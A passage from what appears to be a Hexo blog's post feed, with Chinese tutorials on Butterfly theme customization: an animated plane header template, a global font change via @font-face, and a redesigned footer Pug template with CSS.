class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .trigger</span><br><span class="line">    .monitor</span><br><span class="line">      .opening</span><br><span class="line">        .camera.o-x</span><br><span class="line">          .camera.o-y</span><br><span class="line">            .camera.o-z</span><br><span class="line">              .awing</span><br><span class="line">                .stars</span><br><span class="line">                  .star</span><br><span class="line">                  .star</span><br><span class="line">                  .star</span><br><span class="line">                  .star</span><br><span class="line">                  .star</span><br><span class="line">                  .star</span><br><span class="line">                  .star</span><br><span class="line">                  .star</span><br><span class="line">                  .star</span><br><span class="line">                  .star</span><br><span class="line">                  .star</span><br><span class="line">                  .star</span><br><span class="line">                  .star</span><br><span class="line">                  .star</span><br><span class="line">                  .star</span><br><span class="line">                  .star</span><br><span class="line">                  .star</span><br><span class="line">                  .star</span><br><span class="line">                  .star</span><br><span class="line">                  .star</span><br><span class="line">                  .star</span><br><span class="line">                  .star</span><br><span class="line">                  .star</span><br><span class="line">                  .star</span><br><span class="line">                  .star</span><br><span class="line">                  .star</span><br><span class="line">                  .star</span><br><span class="line">                  .star</span><br><span class="line">                  .star</span><br><span class="line">                  .star</span><br><span class="line">                  .star</span><br><span class="line">                  .star</span><br><span class="line">                  .star</span><br><span class="line">                  .star</span><br><span class="line">                  .star</span><br><span class="line">                  .star</span><br><span class="line">                  .star</span><br><span class="line">                  .star</span><br><span class="line">                  .star</span><br><span class="line">                  .star</span><br><span class="line">                .fly.o-x</span><br><span class="line">                  .fly.o-y</span><br><span class="line">                    .fly.o-z</span><br><span class="line">                      .free_bounce</span><br><span class="line">                        .free_rotate</span><br><span class="line">                          .body</span><br><span class="line">                            .cockpit</span><br><span class="line">                              .under</span><br><span class="line">                              .back</span><br><span class="line">                              .left</span><br><span class="line">                              .right</span><br><span class="line">                              .edge_left</span><br><span class="line">                              .edge_right</span><br><span class="line">                              .boosts</span><br><span class="line">                                .boost</span><br><span class="line">                                .boost</span><br><span class="line">                                .boost</span><br><span class="line">                                .boost</span><br><span class="line">                                .boost</span><br><span class="line">                                .boost</span><br><span class="line">                                .boost</span><br><span class="line">                                .boost</span><br><span class="line">                                .boost</span><br><span class="line">                                .boost</span><br><span class="line">                                .boost</span><br><span class="line">                                .boost</span><br><span class="line">                                .boost</span><br><span class="line">                                .boost</span><br><span class="line">                                .boost</span><br><span class="line">                                .boost</span><br><span class="line">                                .boost</span><br><span class="line">                                .boost</span><br><span class="line">                                .boost</span><br><span class="line">                                .boost</span><br><span class="line">                                .boost</span><br><span class="line">                                .boost</span><br><span class="line">                                .boost</span><br><span class="line">                                .boost</span><br><span class="line">                                .boost</span><br><span class="line">                                .boost</span><br><span class="line">                                .boost</span><br><span class="line">                                .boost</span><br><span class="line">                                .boost</span><br><span class="line">                                .boost</span><br><span class="line">                            .wing_left</span><br><span class="line">                              .under</span><br><span class="line">                              .back</span><br><span class="line">                              .left</span><br><span class="line">                              .right</span><br><span class="line">                            .wing_right</span><br><span class="line">                              .under</span><br><span class="line">                              .back</span><br><span class="line">                              .left</span><br><span class="line">                              .right  </span><br></pre></td></tr></table></figure><p>在<code>BlogRoot/themes/butterfly/layout/includes/header/index.pug</code>中引入上一步中创建的<code>plane.pug</code>文件。</p><p>跟#site-info、#scroll-down同级，具体位置如下图：</p><p><img src="https://bu.dusays.com/2022/11/06/63675e35a04af.jpg" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!=partial(&#x27;includes/header/plane&#x27;, &#123;&#125;, &#123;cache: true&#125;)</span><br></pre></td></tr></table></figure><p>在主题配置文件_config.butterfly.yml中引入plane.css。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">inject:</span></span><br><span class="line">  <span class="attr">head:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&lt;link</span> <span class="string">rel=&quot;stylesheet&quot;</span> <span class="string">href=&quot;https://npm.elemecdn.com/ethan4116-blog/lib/css/plane_v2.css&quot;&gt;</span></span><br></pre></td></tr></table></figure><p>最后重新编译运行即可看见效果。</p><h2 id="BUG-反馈"><a href="#BUG-反馈" class="headerlink" title="BUG 反馈"></a>BUG 反馈</h2><p>关于下方有横向滚动条的 bug , 如下图所示</p><p><img src="https://bu.dusays.com/2023/01/13/63c1014876e96.webp" alt="img"></p><p>为了及时解决这个 bug , 在自定义的 css 中加入下面这个样式即可。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#drone</span> <span class="selector-class">.container</span> &#123;</span><br><span class="line">    <span class="attribute">overflow</span>: hidden;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重新编译运行即可看见效果。</p>]]></content>
      
      
      <categories>
          
          <category> 博客 </category>
          
          <category> 美化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客美化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>全局修改博客字体</title>
      <link href="/post/c174d6ac.html"/>
      <url>/post/c174d6ac.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>参考自：<a href="https://imbhj.com/25c13146/">Butterfly 如何优雅的改字体</a></p><details class="folding-tag" ><summary> 效果预览 </summary>              <div class='content'>              <p><img src="https://s1.ax1x.com/2023/06/01/p9xLJbV.png" alt=""></p>              </div>            </details><h2 id="实现步骤"><a href="#实现步骤" class="headerlink" title="实现步骤"></a>实现步骤</h2><h3 id="下载字体"><a href="#下载字体" class="headerlink" title="下载字体"></a>下载字体</h3><p>推荐网站：<a href="https://www.fonts.net.cn/commercial-free/fonts-zh-1.html">字体天下</a></p><p>下载字体并解压得到<code>ttf文件</code></p><h3 id="引入字体"><a href="#引入字体" class="headerlink" title="引入字体"></a>引入字体</h3><p>新建<code>fonts</code>文件夹：Blog根目录\themes\butterfly\source\fonts，将<code>ttf文件</code>移到该文件夹</p><p>打开Blog根目录\source\css\custom.css，缺少的文件或文件夹直接新建即可，写入下列代码</p><p>注：<code>font-family</code>支持自定义名称；不要忘记修改<code>src</code>!</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 字体样式 */</span></span><br><span class="line"><span class="keyword">@font-face</span> &#123;</span><br><span class="line">    <span class="attribute">font-family</span>: <span class="string">&#x27;ziti&#x27;</span>;</span><br><span class="line">    <span class="attribute">font-display</span>: swap;</span><br><span class="line">    <span class="attribute">src</span>: <span class="built_in">url</span>(<span class="string">&#x27;/fonts/MaoKenZhuYuanTi-MaokenZhuyuanTi-2.ttf&#x27;</span>) <span class="built_in">format</span>(<span class="string">&quot;truetype&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>打开主题配置文件_config.butterfly.yml，搜索<code>font-family</code>，定位到下列位置并将上面代码中的<code>font-family</code>的名称写入</p><p>注：<code>Microsoft YaHei</code>是为了防止字体加载不出来导致没有文本的备用字体</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Global font settings</span></span><br><span class="line"><span class="comment"># Don&#x27;t modify the following settings unless you know how they work (非必要不要修改)</span></span><br><span class="line"><span class="attr">font:</span></span><br><span class="line">  <span class="attr">global-font-size:</span></span><br><span class="line">  <span class="attr">code-font-size:</span></span><br><span class="line">  <span class="attr">font-family:</span> <span class="string">ziti,&quot;Microsoft</span> <span class="string">YaHei&quot;</span></span><br><span class="line">  <span class="attr">code-font-family:</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 博客 </category>
          
          <category> 美化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客美化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>页脚美化</title>
      <link href="/post/63a1f478.html"/>
      <url>/post/63a1f478.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>转载自：<a href="https://www.fomal.cc/posts/d739261b.html#%E6%9C%AC%E7%AB%99%E5%90%8C%E6%AC%BE%E9%A1%B5%E8%84%9A-tzy%E5%A4%A7%E4%BD%AC-%E5%BE%AE%E8%B0%83">Fomalhaut同款页脚</a></p><details class="folding-tag" ><summary> 效果预览 </summary>              <div class='content'>              <p><img src="https://s1.ax1x.com/2023/06/01/p9xfxJ0.png" alt=""></p>              </div>            </details><p><strong>注：框出来的徽标可以自行制作，参考<a href="https://www.dqywy.top/post/947cbf4b.html">页脚徽标制作</a></strong></p><h2 id="实现步骤"><a href="#实现步骤" class="headerlink" title="实现步骤"></a>实现步骤</h2><ol><li>将<code>[BlogRoot]/themes/butterfly/layout/includes/footer.pug</code>替换成如下代码这块东西分为几个部分，一个是以<code>#ft</code>为块的DOM，其中分为了<code>格言</code>、<code>猜你想看</code>、<code>推荐友链</code>三部分，参考图中的位置结合自己的喜好进行修改即可，图像、文字和链接均替换成你自己的（记住不要用我的链接！！！）；<code>if theme.footer.owner.enable</code>起这一块是主题指定的信息版权信息，我把主题配置项的<code>copyright</code>和<code>custom_text</code>这两项留空了，因此只会显示<code>©2022 By Fomalhaut🥝</code>；再然后就是<code>#workboard</code>这块，这块的信息由js逻辑写入与更新，可以自定义；最后是<code>p#ghbdages</code>这块，是徽标显示，大家可以到<a href="https://shields.io/">shields.io</a>按照自己的信息生成（不要用我的！！！）:</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">#footer-wrap</span><br><span class="line">  #ft</span><br><span class="line">    .ft-item-1</span><br><span class="line">      .t-top</span><br><span class="line">        .t-t-l</span><br><span class="line">          p.ft-t.t-l-t Motto🧬</span><br><span class="line">          .bg-ad</span><br><span class="line">            div</span><br><span class="line">              | A contented mind is a perpetual feast. 知足常乐🍰</span><br><span class="line">            .btn-xz-box</span><br><span class="line">              a.btn-xz(href=&#x27;https://www.dqywy.top/about/&#x27;) 关于博主</span><br><span class="line">        .t-t-r</span><br><span class="line">          p.ft-t.t-l-t 猜你想看💡</span><br><span class="line">          ul.ft-links</span><br><span class="line">            li</span><br><span class="line">              a(href=&#x27;/posts/eec9786.html&#x27;) 🐳魔改指南</span><br><span class="line">              a(href=&#x27;/box/nav/&#x27;) 👻待做清单</span><br><span class="line">            li</span><br><span class="line">              a(href=&#x27;/personal/about/&#x27;) 🪜文章分类</span><br><span class="line">              a(href=&#x27;/archives/&#x27;) 🧭文章标签</span><br><span class="line">            li</span><br><span class="line">              a(href=&#x27;/categories/&#x27;) 🔍时间轴</span><br><span class="line">              a(href=&#x27;/tags/&#x27;) ⭐Github</span><br><span class="line"></span><br><span class="line">    .ft-item-2</span><br><span class="line">      p.ft-t 推荐友链⌛</span><br><span class="line">      .ft-img-group</span><br><span class="line">        .img-group-item</span><br><span class="line">          a(href=&#x27;http://47.109.96.67:4000/&#x27; title=&#x27;攀墙の博客&#x27;)</span><br><span class="line">            img(src=&#x27;https://s1.ax1x.com/2023/05/07/p9wAPit.jpg&#x27; alt=&#x27;图片出问题啦~&#x27;)</span><br><span class="line"></span><br><span class="line">  if theme.footer.owner.enable</span><br><span class="line">    - var now = new Date()</span><br><span class="line">    - var nowYear = now.getFullYear()</span><br><span class="line">    if theme.footer.owner.since &amp;&amp; theme.footer.owner.since != nowYear</span><br><span class="line">      .copyright</span><br><span class="line">        span!= `&lt;b&gt;&amp;copy;$&#123;theme.footer.owner.since&#125; - $&#123;nowYear&#125;&lt;/b&gt;`</span><br><span class="line">        span!= `&lt;b&gt;&amp;nbsp;&amp;nbsp;By $&#123;config.author&#125;&lt;/b&gt;`</span><br><span class="line">    else</span><br><span class="line">       .copyright</span><br><span class="line">         span!= `&lt;b&gt;&amp;copy;$&#123;nowYear&#125;&lt;/b&gt;`</span><br><span class="line">         span!= `&lt;b&gt;&amp;nbsp;&amp;nbsp;By $&#123;config.author&#125;&lt;/b&gt;`</span><br><span class="line">  if theme.footer.copyright</span><br><span class="line">    .framework-info</span><br><span class="line">      span= _p(&#x27;footer.framework&#x27;) + &#x27; &#x27;</span><br><span class="line">      a(href=&#x27;https://hexo.io&#x27;)= &#x27;Hexo&#x27;</span><br><span class="line">      span.footer-separator |</span><br><span class="line">      span= _p(&#x27;footer.theme&#x27;) + &#x27; &#x27;</span><br><span class="line">      a(href=&#x27;https://github.com/jerryc127/hexo-theme-butterfly&#x27;)= &#x27;Butterfly&#x27;</span><br><span class="line">  if theme.footer.custom_text</span><br><span class="line">    .footer_custom_text!=`$&#123;theme.footer.custom_text&#125;`</span><br><span class="line"></span><br><span class="line">  #workboard</span><br><span class="line"></span><br><span class="line">  p#ghbdages</span><br><span class="line">    a.github-badge(target=&#x27;_blank&#x27; href=&quot;https://hexo.io/&quot; style=&#x27;margin-inline:5px&#x27; title=&quot;博客框架为Hexo_v6.3.0&quot;)</span><br><span class="line">      img(src=&quot;https://img.shields.io/badge/Frame-Hexo-blue?logo=Hexo&amp;style=plastic&quot; alt=&#x27;&#x27;)</span><br><span class="line"></span><br><span class="line">    a.github-badge(target=&#x27;_blank&#x27; href=&quot;https://butterfly.js.org/&quot; style=&#x27;margin-inline:5px&#x27; title=&quot;主题版本Butterfly_v3.8.1&quot;)</span><br><span class="line">      img(src=&quot;https://sourcebucket.s3.ladydaily.com/badge/Theme-Butterfly-6513df.svg&quot; alt=&#x27;&#x27;)</span><br><span class="line"></span><br><span class="line">    a.github-badge(target=&#x27;_blank&#x27; href=&quot;https://vercel.com/&quot; style=&#x27;margin-inline:5px&#x27; title=&quot;本站采用多线部署，主线路托管于Vercel&quot;)</span><br><span class="line">      img(src=&quot;https://sourcebucket.s3.ladydaily.com/badge/Hosted-Vercel-brightgreen.svg&quot; alt=&#x27;&#x27;)</span><br><span class="line"></span><br><span class="line">    a.github-badge(target=&#x27;_blank&#x27; href=&quot;https://github.com/hellodqy/hellodqy.github.io&quot; style=&#x27;margin-inline:5px&#x27; title=&quot;本网站源码由Github提供存储仓库&quot;)</span><br><span class="line">      img(src=&quot; https://sourcebucket.s3.ladydaily.com/badge/Source-Github-d021d6.svg&quot; alt=&#x27;&#x27;)</span><br><span class="line"></span><br><span class="line">    a.github-badge(target=&#x27;_blank&#x27; href=&quot;https://www.algolia.com/&quot; style=&#x27;margin-inline:5px&#x27; title=&quot;本网站搜索引擎由Algolia提供&quot;)</span><br><span class="line">      img(src=&quot;https://img.shields.io/badge/Search-Algolia-9cf?logo=algolia&amp;style=plastic&quot; alt=&#x27;&#x27;)</span><br><span class="line"></span><br><span class="line">    a.github-badge(target=&#x27;_blank&#x27; href=&quot;https://account.mongodb.com/&quot; style=&#x27;margin-inline:5px&#x27; title=&quot;本网站数据库由MongoDB提供&quot;)</span><br><span class="line">      img(src=&quot;https://img.shields.io/badge/DataBase-MongoDB-orange?logo=MongoDB&amp;style=plastic&quot; alt=&#x27;&#x27;)</span><br><span class="line"></span><br><span class="line">    a.github-badge(target=&#x27;_blank&#x27; href=&quot;https://bz.zzzmh.cn/index&quot; style=&#x27;margin-inline:5px&#x27; title=&quot;本网站壁纸封面由极简壁纸提供&quot;)</span><br><span class="line">      img(src=&quot;https://img.shields.io/badge/Wallpaper-Minimalism-ff69b4?logo=Hexo&amp;style=plastic&quot; alt=&#x27;&#x27;)</span><br><span class="line"></span><br><span class="line">    a.github-badge(target=&#x27;_blank&#x27; href=&quot;https://smms.app/&quot; style=&#x27;margin-inline:5px&#x27; title=&quot;本网站图床由SMMS提供&quot;)</span><br><span class="line">      img(src=&quot;https://img.shields.io/badge/Photos-SMMS-red?logo=smashingmagazine&amp;style=plastic&quot; alt=&#x27;&#x27;)</span><br></pre></td></tr></table></figure><ol><li>将以下代码复制到自定义的<code>custom.css</code>中，其中颜色、圆角等可以根据你自己的喜好进行修改:</li></ol><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span 